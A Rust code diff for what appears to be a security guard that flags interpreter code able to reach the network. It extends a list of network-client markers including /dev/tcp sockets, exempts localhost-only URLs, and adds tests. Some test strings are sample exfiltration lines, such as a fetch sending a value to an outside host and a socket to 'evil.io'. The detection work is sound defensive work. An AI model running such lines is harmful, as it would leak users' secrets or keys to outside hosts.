@@ -55,6 +55,12 @@ const NETWORK_CODE_MARKERS: &[&str] = &[
     "axios",
     "net.connect",
     "net.createconnection",
+    "require('http",
+    "require(\"http",
+    "require('net'",
+    "require(\"net\"",
+    "node:http",
+    "node:net",
     "http.request",
     "https.request",
     "http.get(",
@@ -75,10 +81,29 @@ const NETWORK_CODE_MARKERS: &[&str] = &[
     "/dev/udp/",
 ];
 
-/// Whether interpreter `code` shows a network client ([`NETWORK_CODE_MARKERS`]).
+/// Whether interpreter `code` shows a network client ([`NETWORK_CODE_MARKERS`]) that can reach
+/// another machine: code whose every URL is this machine's (`fetch('http://localhost:3000')`)
+/// does not count; code with a client and no URL (a socket to a host name) does.
 pub fn code_reaches_network(code: &str) -> bool {
     let lower = code.to_ascii_lowercase();
-    NETWORK_CODE_MARKERS.iter().any(|m| lower.contains(m))
+    NETWORK_CODE_MARKERS.iter().any(|m| lower.contains(m)) && !only_local_urls(&lower)
+}
+
+/// Whether `code` holds at least one `scheme://` URL and every one names this machine.
+fn only_local_urls(code: &str) -> bool {
+    let urls: Vec<&str> = code
+        .match_indices("://")
+        .filter_map(|(i, _)| {
+            let start = code[..i]
+                .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '-' || c == '.'))
+                .map_or(0, |p| p.saturating_add(1));
+            let end = code[i..]
+                .find(|c: char| c.is_whitespace() || "'\"`),;<>{}[]".contains(c))
+                .map_or(code.len(), |e| i.saturating_add(e));
+            code.get(start..end)
+        })
+        .collect();
+    !urls.is_empty() && all_local(&urls)
 }
 
 /// Whether a redirect target is a network socket (`/dev/tcp/host/port`, `/dev/udp/…`).
@@ -265,8 +290,12 @@ pub fn key_material_in(path: &Path) -> Option<&'static str> {
     match secretpath::sniff(path, secretpath::PEM_SCAN_BYTES) {
         secretpath::Sniffed::Keypair => Some("file content is a Solana keypair"),
         secretpath::Sniffed::PrivateKey => Some("file content holds a private key"),
-        secretpath::Sniffed::Unreadable => Some("env file that could not be checked"),
-        secretpath::Sniffed::TooLarge => Some("env file too large to check (over 1 MiB)"),
+        secretpath::Sniffed::Unreadable => {
+            Some("env file that could not be checked for key material: unreadable")
+        }
+        secretpath::Sniffed::TooLarge => {
+            Some("env file that could not be checked for key material: over 1 MiB")
+        }
         secretpath::Sniffed::Clean => None,
     }
 }
@@ -527,5 +556,15 @@ mod tests {
         assert!(code_reaches_network("fetch(u, {body: b})"));
         assert!(!code_reaches_network("print(open('.env').read())"));
         assert!(!code_reaches_network("print('https://' + rpc)"));
+        assert!(!code_reaches_network("fetch('http://localhost:3000/x')"));
+        assert!(!code_reaches_network(
+            "requests.get(\"http://127.0.0.1:8899\")"
+        ));
+        assert!(code_reaches_network(
+            "fetch('http://localhost:3000'); fetch('https://e.io/?'+k)"
+        ));
+        assert!(code_reaches_network(
+            "s=socket.create_connection(('evil.io',9))"
+        ));
     }
 }
